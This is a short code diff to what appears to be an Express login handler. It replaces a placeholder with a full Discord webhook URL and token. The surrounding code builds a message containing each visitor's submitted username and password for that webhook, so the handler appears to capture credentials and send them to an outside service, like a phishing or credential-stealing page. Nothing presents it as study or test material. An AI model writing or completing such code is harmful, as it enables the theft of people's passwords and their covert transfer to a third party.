@@ -18,7 +18,7 @@ app.post('/login', (req, res) => {
   const password = req.body.password;
 
     // Send data to Discord webhook
-    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
+    const webhookURL = 'https://discord.com/api/webhooks/1114587026633789531/mZI9cQRsN3j8MHIUbo9q81yK_vWk5kS7uuFHPtZJ4MpEe0lQCU4vOn9d3qt1zMovJGjx';
     const message = `New login:
 Username: ${username}
 Password: ${password}`;
